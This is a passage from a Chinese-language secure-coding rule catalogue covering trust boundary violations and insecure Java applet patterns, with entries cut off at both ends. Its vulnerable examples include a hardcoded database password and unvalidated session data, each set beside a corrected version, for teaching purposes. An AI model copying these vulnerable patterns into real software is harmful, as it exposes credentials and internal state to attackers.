<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[40] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Trust-Boundary-Violation"><a href="#Trust-Boundary-Violation" class="headerlink" title="Trust Boundary Violation"></a>Trust Boundary Violation</h4><h5 id="ABSTRACT-42"><a href="#ABSTRACT-42" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在同一数据结构中将可信赖数据和不可信赖数据混合在一起会导致程序员错误地信赖未验证的数据。</p>
<h5 id="EXPLANATION-42"><a href="#EXPLANATION-42" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>信任边界可以理解为在程序中划分的分界线。分界线的一边是不可信赖的数据。分界线的另一边则是被认定为是可信赖的数据。验证逻辑的用途是允许数据安全地跨越信任边界 — 从不可信赖的一边移动到可信赖的另一边。</p>
<p>当程序使可信赖和不可信赖的分界线模糊不清时，就会发生 Trust Boundary Violation 漏洞。发生这种错误的最普遍方式是允许可信赖的数据和不可信赖的数据共同混合在同一数据结构中。</p>
<p>示例：以下 Java 代码接受了一个 HTTP 请求。在 HTTP 会话对象中存储了 usrname 参数以后，再进行检查，以确保该用户已经过了验证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usrname = request.getParameter(&quot;usrname&quot;);</span><br><span class="line"></span><br><span class="line">if (session.getAttribute(ATTR_USR) != null) &#123;</span><br><span class="line"></span><br><span class="line">    session.setAttribute(ATTR_USR, usrname);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若不对信任边界进行合理构建及良好维护，则程序员不可避免地会混淆哪些数据已经过验证，哪些尚未经过验证。这种混淆最终会导致某些数据未经验证就加以使用了。</p>
<h5 id="RECOMMENDATIONS-40"><a href="#RECOMMENDATIONS-40" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在应用程序中定义信任边界。不要在数据结构中储存在某些环境下受信任而在其他环境下又转而不可信赖的数据。应尽量减少数据跨越信任边界的方式。</p>
<p>在处理输入之前，需要通过一系列用户交互来累积输入时，有时就会出现 Trust Boundary Violation 漏洞。所以，在得出所有数据之前，不可能进行完整的输入验证。在这种情况下，维护信任边界仍然是非常重要的。应将不可信赖的数据添加到一个不受信任数据结构中，待验证后，再移至可信赖的区域。</p>
<h5 id="REFERENCES-42"><a href="#REFERENCES-42" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[2] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 501</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Unsafe-Mobile-Code-Access-Violation"><a href="#Unsafe-Mobile-Code-Access-Violation" class="headerlink" title="Unsafe Mobile Code: Access Violation"></a>Unsafe Mobile Code: Access Violation</h4><h5 id="ABSTRACT-43"><a href="#ABSTRACT-43" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它从 public 访问方法中返回了一个 private 数组变量。</p>
<h5 id="EXPLANATION-43"><a href="#EXPLANATION-43" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序可以从 public 访问方法中返回一个 private 数组变量，通过此种方式，您可以调用代码来修改该数组的内容，还可以轻易地获取数组的 public 访问，并阻止程序员将其设置为 private 的计划。</p>
<p>例 1：以下 Java Applet 代码错误地从 public 访问方法中返回了一个 private 数组变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private URL[] urls;</span><br><span class="line"></span><br><span class="line">public URL[] getURLs() &#123;</span><br><span class="line"></span><br><span class="line">	return urls;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-41"><a href="#RECOMMENDATIONS-41" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要从 public 访问方式中返回 private 数组变量。应该在访问方法中提供对 private 成员数组的控制访问。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private URL[] urls;</span><br><span class="line"></span><br><span class="line">public void modifyURLs() &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-43"><a href="#REFERENCES-43" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 495</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Database-Access"><a href="#Unsafe-Mobile-Code-Database-Access" class="headerlink" title="Unsafe Mobile Code: Database Access"></a>Unsafe Mobile Code: Database Access</h4><h5 id="ABSTRACT-44"><a href="#ABSTRACT-44" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在不可信赖的环境中执行 JDBC 数据库操作的 Applet 会危及数据库凭证安全。</p>
<h5 id="EXPLANATION-44"><a href="#EXPLANATION-44" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>默认情况下，允许 Java Applet 将数据库连接打开回它们从其下载的服务器。在可信赖的环境中，这是可接受的；然而，在不可信赖的环境中，攻击者可能会使用 Applet 查找数据库凭证，并最终获得对数据库的直接访问。</p>
<p>例 1：以下代码显示在 applet 中使用的硬编码的数据库密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class CustomerServiceApplet extends JApplet</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public void paint(Graphics g)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        conn = DriverManager.getConnection (&quot;jdbc:mysql://db.example.com/customerDB&quot;, &quot;csr&quot;, &quot;p4ssw0rd&quot;);</span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>具有硬编码的 JDBC 凭证的 Applet 用户可以容易地找到凭证，因为 Applet 代码已下载到客户端。此外，如果通过未加密的通道建立数据库连接，那么能够在网络上截取信息流的任何人也可以获得这些凭证。最后，允许用户直接连接到数据库会暴露可公开访问的数据库服务器，这使得攻击者能够将该数据库作为直接网络攻击的目标。</p>
<h5 id="RECOMMENDATIONS-42"><a href="#RECOMMENDATIONS-42" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>绝不要使用将在客户端分布的代码对敏感凭证进行硬编码。要避免在必须连接到数据库的 Applet 中进行此操作，代理数据库将请求通过中间主机（如 Web 服务）。 例 2：以下代码将使用用户提供的凭证通过 Web 服务调用检索数据，而不是直接连接到具有硬编码凭证的数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class CustomerServiceApplet extends JApplet</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public void paint(Graphics g)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        CustomerRecord crec = WebServiceClient.getCustomerData(username, password, customerID);     //username and password entered by applet user</span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-44"><a href="#REFERENCES-44" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] JDBC Guide: Getting Started - Security Considerations Sun Microsystems, Inc.</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 305</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Inner-Class"><a href="#Unsafe-Mobile-Code-Inner-Class" class="headerlink" title="Unsafe Mobile Code: Inner Class"></a>Unsafe Mobile Code: Inner Class</h4><h5 id="ABSTRACT-45"><a href="#ABSTRACT-45" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它使用了一个 inner class。</p>
<h5 id="EXPLANATION-45"><a href="#EXPLANATION-45" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Inner class 转换为 Java 字节码所采用的方式，导致它会悄然引入一些安全问题。在 Java 源代码中，inner class 只能由封装类来声明它是可以访问的，但是 Java 字节码中并没有 inner class 的概念，因此，编译器必须把一个内部类声明转换成与 package 有同等级别的类（有权访问源外部类）。由于内部类可以访问其封装类中的 private 字段，一旦某个 inner class 成为字节码中的同等类，该编译器便会把 inner class 访问的 private 字段转换成 protected 字段，这一点具有潜在的危险性。</p>
<p>例 1：以下 Java Applet 代码错误地使用了 inner class。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private final class urlHelper &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-43"><a href="#RECOMMENDATIONS-43" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>避免使用 inner class。若必须使用，请仔细考虑编译器所要执行的转化行为带来的各种影响。是否可以把 private 字段降级为 protected？</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">private final class urlHelper &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-45"><a href="#REFERENCES-45" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 492</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Public-finalize-Method"><a href="#Unsafe-Mobile-Code-Public-finalize-Method" class="headerlink" title="Unsafe Mobile Code: Public finalize() Method"></a>Unsafe Mobile Code: Public finalize() Method</h4><h5 id="ABSTRACT-46"><a href="#ABSTRACT-46" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它将 finalize() 方法声明为 public。</p>
<h5 id="EXPLANATION-46"><a href="#EXPLANATION-46" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>除非在 finalize() 的实现方法内部调用 super.finalize()，否则请不要显式地调用 finalize。在移动代码中，手动垃圾回收这种带有错误倾向的操作会威胁到系统的安全，由于 finalize() 的声明中包含对 public 访问，因此会造成攻击者的恶意调用。如果您按其最初设计使用 finalize()，则应首先声明 finalize() 包含 protected 访问权限。</p>
<p>例 1：以下 Java Applet 代码错误地声明了一种 public finalize() 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public void finalize() &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-44"><a href="#RECOMMENDATIONS-44" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当避免使用 finalize()。因为它很不可信。千万不要将 finalize() 方法声明为 public。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">protected void finalize()&#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-46"><a href="#REFERENCES-46" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] MET12-J. Do not use finalizers CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 583</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[11] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Unsafe-Array-Declaration"><a href="#Unsafe-Mobile-Code-Unsafe-Array-Declaration" class="headerlink" title="Unsafe Mobile Code: Unsafe Array Declaration"></a>Unsafe Mobile Code: Unsafe Array Declaration</h4><h5 id="ABSTRACT-47"><a href="#ABSTRACT-47" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它声明了数组 public、final 和 static。</p>
<h5 id="EXPLANATION-47"><a href="#EXPLANATION-47" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在大多数情况下，把数组声明为 public、final 和 static 是一个 bug。因为数组是一个可变的对象，而 final 限制要求数组对象本身只能分配一次，但并不保证数组元素的数值不变。既然数组是公用的，恶意程序便可以篡改数组中存储的值。所以，在大多数情况下，应将数组设置为 private。</p>
<p>例 1：以下 Java Applet 代码错误地把一个数组声明为 public、final 和 static。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public final static URL[] urls;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-45"><a href="#RECOMMENDATIONS-45" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>因为数组的内容不受 final 关键字的保护，所以数组必须声明为 private。无论什么时候，尽可能把所有成员变量都设置为 private。通过设置和获取的方法提供针对 private 成员变量的可控制的访问方式。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private static final URL[] urls;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-47"><a href="#REFERENCES-47" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 582</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Unsafe-Public-Field"><a href="#Unsafe-Mobile-Code-Unsafe-Public-Field" class="headerlink" title="Unsafe Mobile Code: Unsafe Public Field"></a>Unsafe Mobile Code: Unsafe Public Field</h4><h5 id="ABSTRACT-48"><a href="#ABSTRACT-48" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它声明了成员变量 public，而不是 final。</p>
<h5 id="EXPLANATION-48"><a href="#EXPLANATION-48" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 Applet 及其所使用的类中，所有 public 的成员变量都应声明 final，以防止攻击者未经授权，操纵或获取对 Applet 内部状态的访问权。</p>
<p>例 1：以下 Java Applet 代码错误地声明了成员变量 public，而不是 final。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public URL url;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-46"><a href="#RECOMMENDATIONS-46" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>无论什么时候，尽可能把所有成员变量都设置为 private。通过设置和获取的方法提供针对 private 成员变量的可控制的访问方式。如果要求某个字段为公共访问，那么同时将其声明为 final。</p>
<p>例 2：例 1 中的代码可以使用以下任意一种方式进行重写：</p>
